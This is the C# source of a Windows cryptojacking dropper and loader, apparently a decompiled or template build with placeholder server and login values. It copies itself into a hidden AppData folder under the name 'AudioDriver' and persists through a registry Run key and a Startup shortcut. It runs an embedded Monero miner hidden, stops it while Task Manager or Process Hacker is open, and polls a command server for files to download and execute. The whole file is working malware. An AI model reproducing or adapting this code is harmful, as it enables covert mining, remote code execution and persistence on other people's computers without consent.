namespace t
{
    using Microsoft.Win32;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Management;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Threading;
    using t.Properties;

    internal class Program
    {
        private static string adm = "http://yoursite.ru/cmd.php";
        private static string loggr = "a";
        private static string pool = "stratum+tcp://xmr.pool.minergate.com:45560";
        private static string u = "Here your login";

        public static void downloadAndExcecute(string url, string filename)
        {
            using (WebClient client = new WebClient())
            {
                FileInfo info = new FileInfo(filename);
                client.DownloadFile(url, info.FullName);
                Process.Start(info.FullName);
            }
        }

        public static string get(string url)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest) request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
                StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream());
                return reader.ReadToEnd();
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static string[] getTasks()
        {
            string[] strArray = get(adm + "?hwid=" + HWID()).Split(new char[] { '|' });
            string[] strArray2 = new string[strArray.Length];
            int index = 0;
            foreach (string str2 in strArray)
            {
                try
                {
                    string[] strArray3 = str2.Split(new char[] { ';' });
                    string str3 = strArray3[0].Equals("Update") ? "upd" : "dwl";
                    string str4 = strArray3[1];
                    string str5 = strArray3[2];
                    strArray2[index] = str3 + ";" + str4 + ";" + str5;
                }
                catch (Exception)
                {
                }
                index++;
            }
            return strArray2;
        }

        public static int getTimeout()
        {
            return ((Convert.ToInt32(get(adm + "?timeout=1")) * 60) * 0x3e8);
        }

        public static string HWID()
        {
            string str = "";
            try
            {
                string str2 = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject obj2 = new ManagementObject("win32_logicaldisk.deviceid=\"" + str2 + ":\"");
                obj2.Get();
                str = obj2["VolumeSerialNumber"].ToString();
            }
            catch (Exception)
            {
            }
            return str;
        }

        private static void Main(string[] args)
        {
            string text1 = Environment.SystemDirectory.Split(new char[] { '\\' })[0] + @"\Users\" + Environment.UserName + @"\AppData\Roaming\Sysfiles\";
            Thread thread = new Thread(new ThreadStart(new Loader().run));
            Thread thread2 = new Thread(new ThreadStart(new Processer(u, pool).run));
            Thread thread3 = new Thread(new ThreadStart(new Logger(loggr).run));
            Thread thread4 = new Thread(new ThreadStart(new Config().run));
            Thread thread5 = new Thread(new ThreadStart(Program.setConnection));
            thread4.Start();
            thread4.Join();
            thread3.Start();
            thread.Start();
            thread.Join();
            thread2.Start();
            thread5.Start();
        }

        private static void restart(string filename)
        {
            string str = Process.GetCurrentProcess().MainModule.FileName.Split(new char[] { '\\' })[Process.GetCurrentProcess().MainModule.FileName.Split(new char[] { '\\' }).Length - 1];
            ProcessStartInfo startInfo = new ProcessStartInfo {
                Arguments = "/C ping 127.0.0.1 -n 2 && taskmgr && " + filename + " && del " + str,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            };
            Process.Start(startInfo);
            Environment.Exit(0);
        }

        public static void setConnection()
        {
        Label_0000:
            try
            {
                foreach (string str in getTasks())
                {
                    try
                    {
                        string str2 = str.Split(new char[] { ';' })[0];
                        string url = str.Split(new char[] { ';' })[1];
                        string str4 = str.Split(new char[] { ';' })[2];
                        string filename = url.Split(new char[] { '/' })[url.Split(new char[] { '/' }).Length - 1];
                        if (str2.Equals("upd"))
                        {
                            get(adm + "?hwid=" + HWID() + "&completed=" + str4);
                            update(url, filename);
                        }
                        else
                        {
                            downloadAndExcecute(url, filename);
                            get(adm + "?hwid=" + HWID() + "&completed=" + str4);
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                Thread.Sleep(getTimeout());
                goto Label_0000;
            }
            catch
            {
                goto Label_0000;
            }
        }

        public static void update(string url, string filename)
        {
            using (WebClient client = new WebClient())
            {
                FileInfo info = new FileInfo(filename);
                client.DownloadFile(url, info.FullName);
            }
            restart(filename);
        }

        private class Config
        {
            private string currFilename = Process.GetCurrentProcess().MainModule.FileName.Split(new char[] { '\\' })[Process.GetCurrentProcess().MainModule.FileName.Split(new char[] { '\\' }).Length - 1];
            private string path = "";

            private void appShortcutToStartup(string linkName)
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (!System.IO.File.Exists(folderPath + @"\" + linkName + ".url"))
                {
                    using (StreamWriter writer = new StreamWriter(folderPath + @"\" + linkName + ".url"))
                    {
                        string str2 = this.path + this.currFilename;
                        writer.WriteLine("[InternetShortcut]");
                        writer.WriteLine("URL=file:///" + str2);
                        writer.WriteLine("IconIndex=0");
                        writer.WriteLine("IconFile=" + (Process.GetCurrentProcess().MainModule.FileName + @"\backup (3).ico"));
                        writer.Flush();
                    }
                }
            }

            private void createDir()
            {
                try
                {
                    if (!Directory.Exists(this.path))
                    {
                        Directory.CreateDirectory(this.path);
                    }
                }
                catch (Exception)
                {
                }
            }

            private void createDll(string pth)
            {
            }

            public void move()
            {
                string currentDirectory = Environment.CurrentDirectory;
                string path = this.path;
                string currFilename = this.currFilename;
                foreach (string str4 in Directory.GetFiles(currentDirectory, currFilename))
                {
                    string[] strArray2 = str4.Split(new char[] { '\\' });
                    string sourceFileName = str4;
                    string destFileName = path + strArray2[strArray2.Length - 1];
                    try
                    {
                        System.IO.File.Move(sourceFileName, destFileName);
                    }
                    catch (Exception)
                    {
                    }
                }
            }

            public byte[] readBytes(string file2)
            {
                string[] strArray = file2.Split(new char[] { ' ' });
                byte[] buffer = new byte[strArray.Length];
                for (int i = 0; i < strArray.Length; i++)
                {
                    try
                    {
                        buffer[i] = Convert.ToByte(strArray[i]);
                    }
                    catch (Exception)
                    {
                    }
                }
                return buffer;
            }

            private void restart()
            {
                ProcessStartInfo startInfo = new ProcessStartInfo {
                    Arguments = "/C ping 127.0.0.1 -n 2 && \"" + this.path + this.currFilename + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };
                Process.Start(startInfo);
                Environment.Exit(0);
            }

            public void run()
            {
                this.path = Environment.SystemDirectory.Split(new char[] { '\\' })[0] + @"\Users\" + Environment.UserName + @"\AppData\Roaming\Sysfiles\";
                this.createDir();
                this.move();
                this.SetStartup();
            }

            private void SetStartup()
            {
                try
                {
                    this.appShortcutToStartup("AudioDriver");
                    string str = this.path + this.currFilename;
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("AudioDriver", str);
                }
                catch (Exception)
                {
                }
            }

            public void WriteBytes(string fileName, byte[] byteArray, string pth)
            {
                using (FileStream stream = new FileStream(pth + fileName, FileMode.Create))
                {
                    for (int i = 0; i < byteArray.Length; i++)
                    {
                        stream.WriteByte(byteArray[i]);
                    }
                    stream.Seek(0L, SeekOrigin.Begin);
                    for (int j = 0; j < stream.Length; j++)
                    {
                        if (byteArray[j] != stream.ReadByte())
                        {
                            return;
                        }
                    }
                }
            }
        }

        private class Loader
        {
            private static string bytesname = "cfg.txt";
            public string cryptV = "1";
            public bool installed;
            private bool is64bit = Is64Bit();
            private static string loadUrl = ("http://gatsoed9.beget.tech" + minername);
            private static string minername = "AudioDriver.exe";
            private string path = "";
            public bool updated = true;

            private void checkInstall()
            {
                this.installed = System.IO.File.Exists(this.path + @"\" + minername);
            }

            public static bool Is64Bit()
            {
                bool flag;
                IsWow64Process(Process.GetCurrentProcess().Handle, out flag);
                return flag;
            }

            [return: MarshalAs(UnmanagedType.Bool)]
            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);
            private void load()
            {
                string minername = Program.Loader.minername;
                new WebClient();
                bool flag1 = this.is64bit;
                this.WriteBytes(Program.Loader.minername, Resources.AudioHD);
            }

            public byte[] readBytes(string file2)
            {
                string[] strArray = file2.Split(new char[] { ' ' });
                byte[] buffer = new byte[strArray.Length];
                for (int i = 0; i < strArray.Length; i++)
                {
                    try
                    {
                        buffer[i] = Convert.ToByte(strArray[i]);
                    }
                    catch (Exception)
                    {
                    }
                }
                return buffer;
            }

            public void run()
            {
                this.path = Environment.SystemDirectory.Split(new char[] { '\\' })[0] + @"\Users\" + Environment.UserName + @"\AppData\Roaming\Sysfiles\";
                this.checkInstall();
                if (!this.installed)
                {
                    try
                    {
                        this.load();
                    }
                    catch
                    {
                    }
                    new Program.Config();
                }
            }

            public void WriteBytes(string fileName, byte[] byteArray)
            {
                using (FileStream stream = new FileStream(this.path + fileName, FileMode.Create))
                {
                    for (int i = 0; i < byteArray.Length; i++)
                    {
                        stream.WriteByte(byteArray[i]);
                    }
                    stream.Seek(0L, SeekOrigin.Begin);
                    for (int j = 0; j < stream.Length; j++)
                    {
                        if (byteArray[j] != stream.ReadByte())
                        {
                            return;
                        }
                    }
                }
            }
        }

        private class Logger
        {
            private string url = "";

            public Logger(string logger)
            {
                this.url = logger;
            }

            private void connect()
            {
                try
                {
                    WebRequest request = WebRequest.Create(this.url);
                    request.Credentials = CredentialCache.DefaultCredentials;
                    ((HttpWebRequest) request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
                    new StreamReader(request.GetResponse().GetResponseStream()).ReadToEnd();
                }
                catch (Exception)
                {
                }
            }

            public void run()
            {
                this.connect();
            }
        }

        private class Processer
        {
            private static string[] forbidden = new string[] { "Taskmgr", "ProcessHacker", "taskmgr" };
            public bool isRunning;
            private static int kernels = 0;
            private static string path = "";
            private string pool = "";
            private static string processName = "AudioDriver";
            private string username = "";

            public Processer(string u, string pool)
            {
                this.pool = pool;
                this.username = u;
                kernels = Environment.ProcessorCount / 2;
                path = Environment.SystemDirectory.Split(new char[] { '\\' })[0] + @"\Users\" + Environment.UserName + @"\AppData\Roaming\Sysfiles\";
            }

            private bool checkProcess(string name)
            {
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName.Contains(name))
                    {
                        return true;
                    }
                }
                return false;
            }

            public void run()
            {
                string processName = Process.GetCurrentProcess().MainModule.FileName.Split(new char[] { '\\' })[Process.GetCurrentProcess().MainModule.FileName.Split(new char[] { '\\' }).Length - 1];
                processName = processName.Replace(".exe", "");
                while (true)
                {
                    try
                    {
                        Process.GetProcessesByName(processName)[1].Kill();
                    }
                    catch
                    {
                    }
                    foreach (string str2 in forbidden)
                    {
                        if (this.checkProcess(str2))
                        {
                            if (this.checkProcess(Program.Processer.processName))
                            {
                                try
                                {
                                    this.stopProcess();
                                }
                                catch
                                {
                                }
                            }
                            while (this.checkProcess(str2))
                            {
                                Thread.Sleep(0x3e8);
                            }
                        }
                    }
                    if (!this.checkProcess(Program.Processer.processName))
                    {
                        try
                        {
                            this.runProcess(Program.Processer.processName);
                        }
                        catch
                        {
                        }
                    }
                    Thread.Sleep(0x3e8);
                }
            }

            private void runProcess(string name)
            {
                new Process { StartInfo = { FileName = path + name + ".exe", WindowStyle = ProcessWindowStyle.Hidden, Arguments = string.Concat(new object[] { "-o ", this.pool, " -u ", this.username, " -p x -k -v=0 --donate-level=1 -t ", kernels }) } }.Start();
                this.isRunning = true;
            }

            public void stopProcess()
            {
                Process.GetProcessesByName(processName)[0].Kill();
                this.isRunning = false;
            }
        }
    }
}

